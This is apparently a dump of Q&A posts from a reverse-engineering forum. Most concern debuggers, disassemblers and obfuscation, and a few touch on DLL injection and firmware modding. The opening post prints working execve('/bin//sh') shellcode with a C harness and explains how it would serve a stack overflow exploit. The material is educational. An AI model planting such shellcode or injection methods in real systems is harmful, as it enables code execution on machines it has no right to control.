//gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
unsigned char code[] = ""\xf7\xe6\x52\xb0\x01\x48\xbb\xdc\x5e\x5e\xe6\xd0\x5e\xc4\xd2\x48\xc1\xc3\x18\x48\xd1\xeb\x53\x48\x8d\x3c\x24\x04\x3a\x0f\x05"";

main()
{
   int (*ret)()=(int(*)()) code;
    ret();
}
</code></pre>

<p>I was curious, what do each of the lines 17-40 do, specifically, and how does this accomplish an exploit?</p>

<p>(Line 17 is the one with the expression ""global _start"")</p>
","<p><strong>EDIT:</strong> @EnricoGhirardi Thanks for pointing the <strong>mul esi</strong> inaccuracy I previously posted!</p>

<p>To start out, the first instruction <strong>mul esi</strong> zeroes out <strong>rax</strong> and <strong>rdx</strong> in the example below (this is only because <strong>rsi</strong> is 0 to begin with). The least significant bits will be stored in <strong>rax</strong> and the most significant bits will be stored in <strong>rdx</strong>. Both of these registers will be zero. We can verify this with the following after compiling the test code:</p>

<pre><code>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
gdb shellcode

**BANNER SNIPPED**

Dump of assembler code for function main:
   0x00000000004004ed &lt;+0&gt;:     push   %rbp
   0x00000000004004ee &lt;+1&gt;:     mov    %rsp,%rbp
   0x00000000004004f1 &lt;+4&gt;:     sub    $0x10,%rsp
   0x00000000004004f5 &lt;+8&gt;:     movq   $0x601060,-0x8(%rbp)
   0x00000000004004fd &lt;+16&gt;:    mov    -0x8(%rbp),%rdx
   0x0000000000400501 &lt;+20&gt;:    mov    $0x0,%eax
   0x0000000000400506 &lt;+25&gt;:    callq  *%rdx
   0x0000000000400508 &lt;+27&gt;:    leaveq 
   0x0000000000400509 &lt;+28&gt;:    retq   
End of assembler dump.
(gdb) b *0x0000000000400506
Breakpoint 1 at 0x400506
(gdb) c
The program is not being run.
(gdb) r


Breakpoint 1, 0x0000000000400506 in main ()
(gdb) si
0x0000000000601060 in code ()
(gdb) disas
Dump of assembler code for function code:
=&gt; 0x0000000000601060 &lt;+0&gt;:     mul    %esi
   0x0000000000601062 &lt;+2&gt;:     push   %rdx
   0x0000000000601063 &lt;+3&gt;:     mov    $0x1,%al
   0x0000000000601065 &lt;+5&gt;:     movabs $0xd2c45ed0e65e5edc,%rbx
   0x000000000060106f &lt;+15&gt;:    rol    $0x18,%rbx
   0x0000000000601073 &lt;+19&gt;:    shr    %rbx
   0x0000000000601076 &lt;+22&gt;:    push   %rbx
   0x0000000000601077 &lt;+23&gt;:    lea    (%rsp),%rdi
   0x000000000060107b &lt;+27&gt;:    add    $0x3a,%al
   0x000000000060107d &lt;+29&gt;:    syscall 
   0x000000000060107f &lt;+31&gt;:    add    %al,(%rax)
End of assembler dump.
(gdb) i r rax rdx
rax            0x0      0
rdx            0x601060 6295648
(gdb) si
0x0000000000601062 in code ()
(gdb) i r rax rdx
rax            0x0      0
rdx            0x0      0
</code></pre>

<p>As we can see, rax and rdx are both 0, which means that esi (or rsi) has been multiplied by zero.</p>

<p>This is important because the shellcode eventually uses a <strong>syscall</strong> on line 29. We can see that syscall on line 29 is preceded by <strong>add al,58</strong> where al is already 1, therefore the rax register will hold a value of 59. </p>

<p>The number <strong>59</strong> is the index for <strong>execve</strong> in the <a href=""https://filippo.io/linux-syscall-table/"" rel=""nofollow noreferrer"">Linux x86_64 syscall table</a> </p>

<p><strong>execve</strong> will execute /bin//sh. Let's check out the function prototype:</p>

<pre><code>int execve(const char *filename, char *const argv[], 
       char *const envp[]); 
</code></pre>

<p>According to the prototype's <a href=""http://www.tutorialspoint.com/unix_system_calls/execve.htm"" rel=""nofollow noreferrer"">description</a>, <strong><em>filename</strong> must be either a binary executable, or a script starting with a line of the form ""#! interpreter [arg]""</em></p>

<p>We will see that eventually the shellcode passed <strong>/bin//sh</strong> as this argument.</p>

<p><strong>argv</strong> are just the arguments passed to the binary. In this case, the arguments are NULL because as we have seen before, the <strong>rsi</strong> register was previously zeroed out on line 20.</p>

<p>Similarly, <strong>envp</strong> are the environment arguments passed to the binary. Again, there are none because we have seen that the <strong>mul %esi</strong> instruction has zeroed out both <strong>rsi</strong> and <strong>rdx</strong>. In x86_64 Linux, the <strong>rsi</strong> and <strong>rdx</strong> registers are the second and third arguments to <strong>execve()</strong> respectively.</p>

<p>You can find more information on x86_64 calling conventions <a href=""https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64"">here</a> to see how arguments are passed into functions. </p>

<p>Finally, the first argument in <strong>execve</strong> is <strong>/bin//sh</strong>, which is eventually passed to the <strong>edi</strong> register. <strong>edi</strong> holds the first function argument in Linux x86_64 assembly.</p>

<p>The interesting part is that this is <strong>polymorphic shellcode</strong>. We can think of polymorphic shellcode as obfuscated machine instructions that deobfuscate themselves upon execution.</p>

<p>On line 23, the hex string <strong>0xd2c45ed0e65e5edc</strong> in ascii is <strong>ÒÄ^Ðæ^^Ü</strong> which is clearly obfuscated.</p>

<p>Lines 24 and 25 deobfuscate this string and we get <strong>0x68732f2f6e69622f</strong> which is <strong>hs//nib/</strong> in ascii. This is <strong>/bin//sh</strong> spelt backwards because the argument is passed <strong>to execve()</strong> in <a href=""https://en.wikipedia.org/wiki/Endianness"" rel=""nofollow noreferrer"">little endian byte order</a>.</p>

<p>For proof of concept, you can run the code in gdb, or use the following deobfuscator I wrote:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;inttypes.h&gt;

uint64_t rol(uint64_t v, unsigned int bits)
{
  return (v&lt;&lt;bits) | (v&gt;&gt;(8*sizeof(uint64_t)-bits));
}

int main(void)
{
  uint64_t obfuscated = 0xd2c45ed0e65e5edc;
  uint64_t deobfuscated = rol(obfuscated, 24);
  deobfuscated /= 2;
  printf(""0x%"" PRIx64 ""\n"", deobfuscated);
  return 0;
}
</code></pre>

<p>You will get the deobfuscated hex string <strong>0x68732f2f6e69622f</strong> which again, is <strong>hs//nib/</strong> in ascii.</p>

<p>Line 26 pushes the deobfuscated /bin//sh on top of the stack (i.e. in the <strong>rsp</strong> register) and line 27 loads the address pointing to the string <strong>/bin//sh</strong> into <strong>rdi</strong>. Again, please note that this string is being passed in little endian byte ordering. Now we can clearly see that <strong>/bin//sh</strong> is the first argument in <strong>execve()</strong></p>

<p>Then, the shell is executed on line 29.</p>

<p>Below is a commented pseudocode summary:</p>

<pre><code>_start:
    mul esi                     ; When this shellcode is executed, rsi and rdx become 0 because they are multiplied by rax which is 0, in Linux x86_64 assembly, rsi is the second argument in a function
    push rdx                    ; save rdx (i.e. the buffer pointer to the shellcode), rdx is also the third argument passed to a syscall in x86_64
    mov al,1                    ; used for obfuscation since mov al, 59 followed by syscall may look suspicious                       
    mov rbx, 0xd2c45ed0e65e5edc ;/bin//sh obfuscated 
    rol rbx,24                  ; Deobfuscate the hex string /bin//sh
    shr rbx,1                   ; Division by 2 to further deobfuscate /bin//sh
    push rbx                    ; Push the hex string on the top of the stack [in rsp]
    lea rdi, [rsp]              ; Load /bin//sh into rdi in little endian
                                ; in linux 86_64 the first argument is passed to rdi during a syscall
    add al,58                   ; al = 59 i.e. call execve
    syscall                     ; execve(""/bin//sh"", 0, *shellcode_buffer)
</code></pre>

<p>As for the C code, the machine instructions that represent the compiled assembly from lines 17 - 29 are stored in a global variable. We can use the following commands to check the bytes from the shellcode:</p>

<pre><code>    $ nasm -felf64 shell.asm -o shell.o
    $ ld shell.o -o shell
    $ xxd shell

    CONTENT SNIPPED
    00000080: f7e6 52b0 0148 bbdc 5e5e e6d0 5ec4 d248  ..R..H..^^..^..H
    00000090: c1c3 1848 d1eb 5348 8d3c 2404 3a0f 0500  ...H..SH.&lt;$.:...
</code></pre>

<p>As we can see, it matches with the following buffer in the C code:</p>

<pre><code>unsigned char code[] = ""\xf7\xe6\x52\xb0\x01\x48\xbb\xdc\x5e\x5e\xe6\xd0\x5e\xc4\xd2\x48\xc1\xc3\x18\x48\xd1\xeb\x53\x48\x8d\x3c\x24\x04\x3a\x0f\x05"";
</code></pre>

<p>The code in <strong>main</strong> simply casts the string buffer global variable into a function pointer which is then called, executing the polymorphic shellcode, and spawning a shell.</p>

<p>Finally, shellcode is just a possible part of an exploit. An exploit consists of an input that is precisely tailored to a specific version of a program and OS. The shellcode can be part of the payload, but operating systems have became more secure adding ASLR (Address Stack Layout Randomization) and DEP (Data Execution Prevention), so generally it is more practical to overwrite a function pointer in to GOT (Global Offset Table) than to inject shellcode into a buffer. Assuming that you were performing a generic stack buffer overflow, the buffer would have to be at least 0x19 bytes long. You would also need some more space to compensate for the rest of the exploit. In other words, you would need a buffer with enough space to fit the shellcode and the rest of the exploit so that you could overwrite the RET address on the stack to redirect program execution (RIP/EIP) to your shellcode. </p>

<p>This is just an example, but there are many more ways this shellcode can be used in a exploit. </p>

<p>Taking a few steps back, this shellcode could fail if <strong>esi/rsi</strong> is not 0 to begin with because if it is not zero, then we will have a second argument passed into <strong>execve()</strong> and possibly even a third agument if the result from the instruction <strong>mul esi</strong> overflows into <strong>edx</strong>. The shellcode would be more reliable if there were an <strong>xor esi, esi</strong> instruction preceeding the <strong>mul</strong> <strong>esi</strong> instruction.</p>

<p>We also might think how the exploit developer came up with the obfuscated hex string <strong>0xd2c45ed0e65e5edc</strong>. They simply took original string <strong>hs//nib/</strong> and applied the deobfuscating instructions in reverse order. You can use the following code for proof of concept:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;inttypes.h&gt;

uint64_t ror(uint64_t v, unsigned int bits)
{
  return (v&gt;&gt;bits) | (v&lt;&lt;(8*sizeof(uint64_t)-bits));
}

int main(void)
{
  uint64_t deobfuscated = 0x68732f2f6e69622f;
  uint64_t obfuscated = deobfuscated * 2;
  obfuscated = ror(obfuscated, 24);
  printf(""0x%"" PRIx64 ""\n"", obfuscated);
  return 0;
}
</code></pre>

<p>You should get the original obfuscated hex string <strong>0xd2c45ed0e65e5edc</strong>.</p>
","11404"
"ELF: How to make IDA show me the correct PLT (Procedure Linkage Table) content?","1090","","<p>I would like to make IDA disassemble the <code>.plt</code> section of ELF files correctly, e.g. as objdump does: </p>

<pre><code>objdump -D -M intel asdf | grep ""Disassembly of section .plt"" -A80
</code></pre>

<p><img src=""https://i.stack.imgur.com/ShG5H.png"" alt=""objdump disassembly""></p>

<p>I don't know why but IDA gives me this (Note the <code>dw ?</code> and <code>dq ?</code>):
<img src=""https://i.stack.imgur.com/H8NSe.png"" alt=""IDA disassembly""></p>

<p>Even the IDA hexeditor does not show me the correct values at the corresponding addresses, but gives me <code>??</code>s.</p>

<p>I tried selecting and deselecting the settings described in the <a href=""https://www.hex-rays.com/products/ida/support/idadoc/1375.shtml"" rel=""nofollow noreferrer"">IDA Online help</a> (search for ""PLT"") but this didn't help...</p>

<blockquote>
  <p>0: Replace PIC form of 'Procedure Linkage Table' to non PIC form</p>
  
  <p>1: Direct jumping from PLT (without GOT) regardless of its form</p>
  
  <p>2: Convert PIC form of loading <code>_GLOBAL_OFFSET_TABLE_[]</code> of address</p>
  
  <p>3: Obliterate auxiliary bytes in PLT &amp; GOT for 'final autoanalysis'</p>
  
  <p>4: Natural form of PIC GOT address loading in relocatable file</p>
  
  <p>5: Unpatched form of PIC GOT references in relocatable file</p>
</blockquote>

<p>How can I configure IDA so that I can access the instructions in the <code>.plt</code> section of an ELF file with IDAPython?</p>
","<p>For a 32bit (but <em>not</em> 64bit) x86 ELF binary, selecting the following options works:</p>

<p><img src=""https://i.stack.imgur.com/HSQMDm.png"" alt=""enter image description here"">
<img src=""https://i.stack.imgur.com/iVEcim.png"" alt=""enter image description here"">
<img src=""https://i.stack.imgur.com/wtRSv.png"" alt=""enter image description here""></p>

<p><strong>UPDATE:</strong></p>

<p>There is a bug in IDA 6.8 (and probably earlier versions): For 64bit x86 ELF binaries, I get the desired disassembly result only when additionally deselecting ""Replace PIC form of ..."". </p>

<p>This was the reason for my confusion and made me post my question.</p>

<p>Hex-rays sent me a patch which fixed it (and which will probably be part of future versions... )</p>
","8885"
"Real PE32(+) entry point - is it documented anywhere?","1090","","<p>Microsoft documentation gives <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms633559%28v=vs.85%29.aspx"" rel=""nofollow"">WinMain()</a> as the entry point for a Windows program, but unlike <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583%28v=vs.85%29.aspx"" rel=""nofollow"">DllMain()</a> it seems to be a pure fiction arranged by the compiler-provided startup code. </p>

<p>I've looked at the output of a few Win32 compilers (32-bit and 64-bit) and in all cases the information passed to <code>WinMain()</code> was synthesised by the startup code and not based on any parameters passed to the entry point by the Windows loader. Also, all the samples I analysed - and all the examples I remember seeing on the 'net - used <code>ExitProcess()</code> even though a simple return from the entry point seems to have exactly the same effect.</p>

<p>Does anyone know of any documentation - official or otherwise - regarding the game rules for PE32(+) entry points?</p>
","<blockquote>
  <p>Microsoft documentation gives <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms633559%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">WinMain()</a> as the entry point for a
  Windows program</p>
</blockquote>

<p>No, Microsoft's documentation doesn't give WinMain() as <em>the</em> entry point for a Windows program.</p>

<p>From the WinMain() documentation to which you linked above (emphasis mine) - ""WinMain entry point [is] the <strong>user-provided entry point</strong> for a graphical Windows-based application... Depending on the programming framework, <strong>the call to the WinMain function can be preceded and followed by additional activities specific to that framework</strong>.""</p>

<p>In other words, if you're building a native application, your compiler will likely build your executable file such that its framework initialization code is executed before your WinMain() function.</p>

<blockquote>
  <p>Does anyone know of any documentation - official or otherwise -
  regarding the game rules for PE32(+) entry points?</p>
</blockquote>

<p>Yes, from the <a href=""http://msdn.microsoft.com/en-us/windows/hardware/gg463119.aspx"" rel=""nofollow noreferrer"">Microsoft PE and COFF Specification</a>, the <code>AddressOfEntryPoint</code> field in the PE header is defined as ""For program images, this is the starting address."" It's this field that will typically point to the framework initialization code described above.</p>

<p>Note that despite <code>AddressOfEntryPoint</code> being the starting address of the program, the code at that address will be executed <em>after</em> TLS callback functions (also documented in the PE/COFF documentation) if they exist, and after statically loaded DLLs' DllMain() functions.</p>

<blockquote>
  <p>parameters passed to the entry point by the Windows loader</p>
</blockquote>

<p>As explained <a href=""https://stackoverflow.com/a/6029691"">here</a> by @igor-skochinsky, ""the registers at the entry point of PE file do not have defined values."" However, as he points out, <code>EAX</code> often points to the <code>AddressOfEntryPoint</code> and <code>EBX</code> often points to the PEB.</p>

<p>You may want to refer to @Ange's <a href=""https://code.google.com/p/corkami/wiki/InitialValues"" rel=""nofollow noreferrer"">Initial values</a> documentation to find other unofficial register values at entry point.</p>
","6912"
"How does storing values in registers result in a functioning program?","1088","","<p>I'm currently learning assembly, but I cannot seem to understand how storing values into registers and manipulating them results in a working program. </p>

<p>I was wondering if you guys could provide a very easy to understand explanation on why certain things are being done within the assembly code.</p>

<p>Take for example the Hello World program in assembly code:</p>

<pre><code>section     .text
global      _start                              ;must be declared for linker (ld)

_start:                                         ;tell linker entry point
</code></pre>

<ol>
<li><p>Why does the message length need to be put into the EDX register? And why is the EDX register chosen rather than a DX register or EAX register?</p>

<pre><code>mov     edx,len                             ;message length
mov     ecx,msg                             ;message to write
</code></pre></li>
<li><p>I also do not understand why we are moving 1 into the EBX register? And for that matter moving 4 into the EAX register?</p>

<pre><code>mov     ebx,1                               ;file descriptor (stdout)
mov     eax,4                               ;system call number (sys_write)
int     0x80                                ;call kernel
</code></pre>

<p>Why are we moving 1 into EAX? What is so significant about EAX compared to the other registers? And what happened to the 4 stored in EAX previously?</p>

<pre><code>mov     eax,1                               ;system call number (sys_exit)
int     0x80                                ;call kernel

section     .data
msg     db  'Hello, world!',0xa                 ;string
len     equ $ - msg                             ;length of string
</code></pre></li>
<li><p>How does data in the individual register interact with each other? How do they know that data is stored within them? </p></li>
</ol>

<p>TL DR: How is it all merged to present Helloworld onto the screen? </p>
","<p>It would be more helpful to give a <em>full</em> sample program instead of bits and pieces. You could inline your questions using <code>;</code>-preprended lines.</p>

<blockquote>
  <p>1) Why does the message length need to be put into the EDX register?
  And why is the EDX register chosen rather than a DX register or EAX
  register?</p>

<pre><code>    mov     edx,len                             ;message length
    mov     ecx,msg                             ;message to write
</code></pre>
</blockquote>

<p>Where (in which register) each parameter lands really is a matter of the architecture (seemingly here x86_64): <a href=""https://en.wikipedia.org/wiki/Application_binary_interface"" rel=""nofollow"">ABI</a>. The order usually is the same as for the C runtime functions which are the frontend to the syscalls, here <a href=""http://man7.org/linux/man-pages/man2/write.2.html"" rel=""nofollow""><code>write</code></a>. It's a convention between the kernel and user mode.</p>

<blockquote>
  <p>2) I also do not understand why we are moving 1 into the EBX register?
  And for that matter moving 4 into the EAX register?</p>

<pre><code>    mov     ebx,1                               ;file descriptor (stdout)
    mov     eax,4                               ;system call number (sys_write)
    int     0x80                                ;call kernel
</code></pre>
</blockquote>

<p><strong>One</strong> is literally the file number of the <a href=""https://en.wikipedia.org/wiki/Standard_streams"" rel=""nofollow"">standard stream</a> named <code>stdout</code>.</p>

<p><strong>Four</strong> is the system call number (essentially an index into a table) and <strong><code>int 0x80</code></strong> is a call gate into the kernel. I.e. execution transitions into the kernel and the respective system call (here <code>sys_write</code>) knows where to take the parameters from.</p>

<blockquote>
  <p>Why are we moving 1 into EAX? What is so significant about EAX
  compared to the other registers? And what happened to the 4 stored in
  EAX previously?</p>
</blockquote>

<p>Usually the return value also ends up in EAX or EDX:EAX or similar. So the 4 would have been overwritten. It depends on the return type.</p>

<p><strong>One</strong> in this case is the system call number of <code>sys_exit</code>, the kernel-side function for the libc <a href=""http://man7.org/linux/man-pages/man2/exit.2.html"" rel=""nofollow""><code>exit</code></a> function.</p>

<blockquote>
<pre><code>    mov     eax,1                               ;system call number (sys_exit)
    int     0x80                                ;call kernel

section     .data

msg     db  'Hello, world!',0xa                 ;string
len     equ $ - msg                             ;length of string
</code></pre>
  
  <p>3) How does data in the individual register interact with each other?
  How do they know that data is stored within them?</p>
</blockquote>

<p>They don't. The kernel picks them from these registers and the (user mode) developer simply has to know where to put these pieces of data.</p>

<p>In the normal case the user mode developer will, however, make use of a C runtime, like glibc.</p>
","9526"
"Making application load dll at start","1087","","<p>I've added some functionality to existing application which works through dll injection - my dll loads and patches some stuff. </p>

<p>I would like it to be added to this application permanently so I don't have to inject it manually every time - I know there are some solutions such as:</p>

<ol>
<li>Loader - another application that runs target application and then injects a dll</li>
<li>Patch EP - patch entry of target application so it loads my dll before executing rest</li>
<li>AppInit_DLL - making it loads to almost every process through this register entry and then checking if we are in the right one, unload otherwise</li>
</ol>

<p>But are those options most optimal? First and second requires some work (maybe there are some already existing tools of which I don't know and which allows it? so I don't have to prepare it all myself), and third seems a bit over-excessive. 
Just to expand my knowledge - what are the other options?</p>
","<p>You could also add the DLL to the EXE's Import Table. This has the benefit of not loading the DLL into every process that loads user32.dll (which is an issue with #3), and you can do this Import Table addition easily with a tool like <a href=""http://www.woodmann.com/collaborative/tools/index.php/IIDKing"" rel=""nofollow noreferrer"">IIDKing</a>:</p>

<p><a href=""http://www.woodmann.com/collaborative/tools/index.php/IIDKing"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Sxe2n.png"" alt=""IIDKing""></a></p>
","8121"
"What are good Windows anti-debug references?","1080","","<p>What are good anti-debug references for Windows which help with manual unpacking, emulating, or sandboxing?</p>
","<ul>
<li>Peter Ferrie's <a href=""http://pferrie.host22.com/papers/antidebug.pdf"">“Ultimate” Anti-Debugging Reference</a> (PDF, 147 pages) contains <strong>many</strong> anti-debugs, whether they're hardware or API based...</li>
<li>Walied Assar's <a href=""http://waleedassar.blogspot.com/"">blog</a> shows his researches, which are focused on finding new anti-debugs.</li>
</ul>

<p>other (maybe redundant) resources:</p>

<ul>
<li>Nicolas Fallière's <a href=""http://www.symantec.com/connect/articles/windows-anti-debug-reference"">Windows Anti-Debug reference</a></li>
<li>OpenRCE's <a href=""http://www.openrce.org/reference_library/anti_reversing"">Anti Reverse Engineering Techniques Database</a></li>
<li>Daniel Plohmann's <a href=""https://bitbucket.org/fkie_cd_dare/simplifire.antire"">AntiRE</a></li>
<li>Rodrigo Branco's <a href=""http://research.dissect.pe/docs/blackhat2012-paper.pdf"">Scientific but Not Academical Overview of Malware Anti-Debugging, Anti-Disassembly and Anti-
VM Technologies</a></li>
<li>Mark Vincent Yason's <a href=""http://www.blackhat.com/presentations/bh-usa-07/Yason/Whitepaper/bh-usa-07-yason-WP.pdf"">Art Of Unpacking</a></li>
</ul>
","1384"
"Radare2 forwarding input to scanf from a file","1079","","<p>I'm debugging a file with radare2 and when I come to <code>scanf</code> function I want to forward input from a .txt file. In gdb I would do this by typing <code>r &lt; text.txt</code>.</p>

<p>Is something like that possible in radare2? I've tried <code>dc &lt; text.txt</code> but it seems that it's not working.</p>
","<p><strong>Always ensure you use radare2 git version.</strong></p>

<p>For that purpose you can use <code>rarun2</code>:</p>

<p>For stdio check what is the tty using <code>tty</code> for stdin just add what file you want to add, then in your rarun2 config file:</p>

<pre><code>#!/usr/bin/rarun2
stdio=/dev/pts/1
stdin=./pattern.txt
</code></pre>

<p>Then just <code>r2 -d /bin/ls -e dbg.profile=bla.rr2</code></p>
","11776"
"How to efficiently simplify obfuscated formula in QF_BV logic with Z3?","1076","","<p>I would like to know if there are efficient ways to simplify arithmetic formula expression over bit-vectors with <a href=""http://z3.codeplex.com/"" rel=""nofollow"">Microsoft Z3</a>. But, first, I would like to explain a bit the problem. Lets start with an example:</p>

<pre><code>x + y == (x ^ y) + 2 * (x &amp; y)
</code></pre>

<p>Both <code>x + y</code> and <code>(x ^ y) + 2 * (x &amp; y)</code> are, in fact, coding the addition over bit-vectors. Of course, the right hand formula is used to confuse a reverser when found in the binary program. I try to find tools and techniques to simplify the obfuscated formula and find the simpler form of the formula (left-hand).</p>

<p>For this, I looked at the Python interface of Z3, trying to see what I can get out of it. So, defining the obfuscated formula is done like this:</p>

<pre><code>&gt;&gt;&gt; from z3 import *
&gt;&gt;&gt; x = BitVec('x', 32)
&gt;&gt;&gt; y = BitVec('y', 32)
&gt;&gt;&gt; fun1 = (x ^ y) + 2 * (x &amp; y)
</code></pre>

<p>Now, lets try to simplify this function with the help of the built-in function <code>simplify</code>:</p>

<pre><code>&gt;&gt;&gt; simplify((x ^ y) + 2 * (x &amp; y))
(x ^ y) + 2*~(~x | ~y)
</code></pre>

<p>Not really convincing... But, lets try to prove the equivalence with <code>x + y</code>:</p>

<pre><code>&gt;&gt;&gt; prove((x ^ y) + 2 * (x &amp; y) == x + y)
proved
&gt;&gt;&gt; prove((x ^ y) + 2 * (x &amp; y) == x - y)
counterexample
[y = 2164268032, x = 2139094080]
</code></pre>

<p>I added a negative result to show that it is also possible to disqualify a formula.</p>

<p>So, if the <code>simplify</code> function is not really convincing, it is still possible to try, in a brute-force manner to compare the unknown formula with a list of simpler and usual formula one after one. But, this way seems extremely inefficient to me. I guess I am missing some smarter algorithms to simplify formula.</p>

<p>I would like to know if there are some already existing tools or well-known techniques to perform in a more efficient manner than the brute-force approach. So, if someone has some hints or comments about this, it would be more than welcome.</p>
","<p>Z3 is an SMT solver.  Its job is to decide the satisfiability of formulas passed in by a user, where the formulas may mix terms from the various theories that Z3 supports.  Coincidentally, in order to make its own job easier by producing a ""simpler"" formula than the one passed in by the user, it implements a simplifier which is not very sophisticated technologically and largely consists of term rewriting rules.</p>

<p>Although the user could pose a query regarding the equivalence of two expressions, Z3's only involvement would be to solve the formula.  I.e. Z3 will not generate candidates for you.  It is your job as the user to provide the candidates and query an SMT solver as to their satisfiability.</p>

<p>In general, synthesizing functions is a challenging task in program synthesis.  These queries are naturally posed in second-order logic, but modern SMT solvers support only restrictions of first-order logic.  To sidestep this problem, some published work takes the route of eliminating most candidates from consideration ahead of time, thereby keeping the number of equivalence queries small.  See for example <a href=""http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.93.8843&amp;rep=rep1&amp;type=pdf"">this paper</a> or <a href=""http://spinroot.com/spin/Workshops/ws13/spin2013_submission_16.pdf"">this one</a>.  Another approach is to specify a template describing what the candidate functions are allowed to look like; a simple example is <a href=""http://theory.stanford.edu/~ataly/Papers/pldi12.pdf"">this paper</a>.  These approaches keep the formula to first-order logic, or even quantifier-free.</p>

<p>In general, you should research program synthesis.</p>
","3611"
"How to stop IDA debugger when a register is set to a particular value?","1074","","<p>I use the following script to set IDA in trace mode and make it stop as soon as EAX register is set to a given value :</p>

<pre><code>#include &lt;idc.idc&gt;

static main()
{
    auto r_eip, code, eax;

    EnableTracing(TRACE_STEP, 1);

    for ( code = GetDebuggerEvent(WFNE_ANY|WFNE_CONT, -1); // resume
        code &gt; 0;
        code = GetDebuggerEvent(WFNE_ANY, -1) )
    {                  
        r_eip = GetEventEa();

        eax = GetRegValue(""EAX"");
        Message(""EAX:%08Xh\n"", eax);

        if ( eax == 0x00000001 )
            break;
    }

    PauseProcess();
    EnableTracing(TRACE_STEP, 0);    
}
</code></pre>

<p>However it does not work : i get the following error message : ""Variable 'EAX' is undefined</p>

<p>If i put the line with <code>eax = GetRegValue(...)</code> in comment, in run but then eax is always zero.</p>

<p>The code is adapted from here :
<a href=""https://www.hex-rays.com/products/ida/debugger/scriptable.shtml"" rel=""nofollow"">https://www.hex-rays.com/products/ida/debugger/scriptable.shtml</a></p>
","<p>You can use the following IDC script for the purpose. It would stop whenever register <code>eax</code> contains 0. The debugger must be running when the script is executed.</p>

<pre><code>#include &lt;idc.idc&gt;

static main()
{
    for(;;)
    {
        StepInto();
        if (GetDebuggerEvent(WFNE_SUSP, -1) == STEP)
        {
            if (eax == 0) 
            {
                break;
            }
        }        
    }
    PauseProcess();
}
</code></pre>
","11708"
"How do Android reverse engineering tools extract packages/ package hierarchy present in Android apps?","1072","","<p>I have been involved in disassembling Android apps using <a href=""https://code.google.com/p/smali/"" rel=""nofollow noreferrer"">baksmali</a> and dexpler. Whenever I disassemble an app, I find the packages and package hierarchy (that would have been available in development scenario) intact. For instance, when I disassemble a task manager app (MD5: 3377f8527479ab4e72bf9fa5eec62abe), I get the package hierarchy as shown in the figure below.<img src=""https://i.stack.imgur.com/Zrhkg.png"" alt=""enter image description here"">. </p>

<p>In this context, I have the following questions,</p>

<ol>
<li>Will this hierarchy of Java packages be preserved and retained while building apps. When we develop apps, of course, we use many packages and we put them in a hierarchy while we build the app. But, all the code written by developers will be converted into a single classes.dex file. Will the packages and package hierarchy information be retained in this classes.dex file or any other part of the apk file (like META-INF)? </li>
<li>If this information is not available from .dex, where does this come from? How does every disassembling/ decompiling tool manages to extract this package hierarchy?</li>
<li>Where to find documentation/ literature relevant to packages and package hierarchy in the app building process? I tried skimming thro' Android documentation in vain.</li>
</ol>
","<p>Yes, the package hierarchy is preserved in the dex file. To be more precise, if a class was named foo.bar.baz.foo.Myclass in the sourcecode, it's name will be foo.bar.baz.foo.Myclass in the .dex as well. Any ""package hierarchy"" will be derived from those class names.</p>

<p>If you want to know more about the .dex file format, the <a href=""http://source.android.com/devices/tech/dalvik/dex-format.html"" rel=""nofollow"">Dalvik Executable Format Reference</a> should contain everything you need.</p>
","4318"
"What is this obfuscation method called?","1071","","<p>I have recently seen the following code obfuscation method: </p>

<pre><code>...
jump loc_1234
;-------------------------
         Bunch of junk
;-------------------------

loc_1234:
code continued...
</code></pre>

<p>The logic behind the obfuscation mechanism looks pretty straight forward. Bunch of junk is inserted into code with jump instructions to jump over it. I guess, the purpose is to confuse linear sweep disassemblers and obfuscate file in general. I would like to learn more about it. Does anyone know what it is called? How effective is this method against modern day anti-virus software?</p>
","<p>This anti-disassembly technique is described as <strong>Jump Instruction with a Constant Condition</strong> in the <em>Pratical Malware Analysis</em> book (Chapter 16, page 336 of the 1st edition). The idea as you described is to have a condition such that the jump is always taken and add code after the jump that will generate a wrong disassembly at the location of the jump. As the disassembler assumes that both branches are coherent, it will disassemble only one of them.</p>

<p>Regarding effectiveness against antivirus software, most of them use emulators. As the condition is always taken, the emulator will continue there and see the right instructions. </p>
","2330"
"IDAPython: Get struct id defined at an address","1067","","<p>Spotted an interesting problem when trying to determine which type of structure (since <code>isStruct(getFlags(ea))</code> returns <code>True</code>) is defined at the given address in the DB. Reading through <code>idc.py</code> didn't help much.</p>

<ul>
<li>Define a <code>struct</code> in the ""structures"" window.</li>
<li>It gets assigned a <code>struct</code> ID, so, it can be accessed from IDC/Python scripts.</li>
<li>Now, define a <code>struct</code> variable somewhere in e.g. the <code>.data</code> section.</li>
</ul>

<p>A solid example:</p>

<pre><code># Some Python code
strid = idaapi.get_struc_id('_s__RTTIClassHierarchyDescriptor')
size = idaapi.get_struc_size(strid)
idaapi.doStruct(ea, size, strid)
</code></pre>

<p>How, knowing the <code>ea</code>, do I get the <code>strid</code> value ?</p>
","<p>This works for me:</p>

<pre><code>ea=here()
ti = idaapi.opinfo_t()
f = idc.GetFlags(ea)
if idaapi.get_opinfo(ea, 0, f, ti):
   print (""tid=%08x - %s"" % (ti.tid, idaapi.get_struc_name(ti.tid)))
</code></pre>

<p>So <code>ti.tid</code> then contains the strid.</p>
","4761"
"Reverse engeneering Devolo firmware","1067","","<p>I am trying to do some reverse engeneering to a Devolo dlan wifi 500 device (mips arquitecture). My objective is to put there some firmware modified by me.</p>

<p>This is where I got so far:</p>

<ol>
<li>Downloaded a firmware update from <a href=""http://update.devolo.com/linux2/apt/pool/main/d/devolo-firmware-dlan500-wifi/"" rel=""nofollow noreferrer"">http://update.devolo.com/linux2/apt/pool/main/d/devolo-firmware-dlan500-wifi/</a></li>
<li>Extracted firmware image from debian package</li>
<li>Analyzed image with binwalk</li>
<li>Extracted contents with firmware mod kit (present on google code).</li>
<li>Modded image</li>
<li>Rebuilded with fmk</li>
